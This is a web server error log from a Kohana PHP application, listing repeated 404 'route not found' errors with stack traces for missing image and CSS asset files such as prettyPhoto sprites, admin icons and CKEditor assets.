2025-10-24 18:52:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/howit2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/howit2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/howit3.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/howit3.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/sprit2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/sprit2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/default_thumbnail.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/default_thumbnail.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/contentPattern.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/contentPattern.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:57 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_square/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:57 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_square/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/btnPrevious.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:52:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:52:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_square/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/dark_rounded/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_square/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_square/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_square/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_square/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/loader.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/light_rounded/sprite.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/prettyPhoto/facebook/btnNext.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/comment_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/comment_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/credit_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/credit_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:53:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/h2bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:53:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/h2bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:54:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/view_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:54:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/view_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:54:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:54:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:54:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/un_save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:54:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/images/un_save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:54:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/radio-off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:54:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/radio-off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:54:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/radio-on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:54:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/radio-on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:54:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/arrow.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:54:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/arrow.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:55:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/arrows.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:55:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/arrows.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:55:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/subIcon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:55:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/subIcon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:55:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/price_banner_res.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:55:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/price_banner_res.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:55:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/slider_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:55:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/slider_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:55:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/booked_confirm.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:55:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/booked_confirm.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:55:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/ui/widgetButtons.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:55:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/ui/widgetButtons.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/leftArrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/leftArrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/rightArrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/rightArrow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/uicolor/yui/assets/bg-v.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/uicolor/yui/assets/bg-v.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/uicolor/yui/assets/bg-h.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/plugins/uicolor/yui/assets/bg-h.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/select2x2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/select2x2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/un_save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/un_save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/view_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/view_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/comment_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/comment_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:57:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/credit_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:57:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/credit_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:58:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/uicolor/yui/assets/bg-v.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:58:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/uicolor/yui/assets/bg-v.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:58:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/uicolor/yui/assets/bg-h.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:58:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/ckeditor/_source/plugins/uicolor/yui/assets/bg-h.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:58:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/img/btn_prev.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:58:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/img/btn_prev.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:58:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/img/btn_next.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:58:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/img/btn_next.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:58:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/img/star-matrix.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:58:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/img/star-matrix.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:58:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/checkbox.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:58:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/checkbox.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:58:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:58:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/save.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/h2bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/images/h2bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_text_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/pop_text_rgt.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/account_settings_rmiddle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/account_settings_rmiddle.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/product_details_bg_bottom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/product_details_bg_bottom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/blue_button_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_rft_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_rft_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_mid_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_lft_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 18:59:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/contact_sub_lft_hover.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 18:59:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/account_settings_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
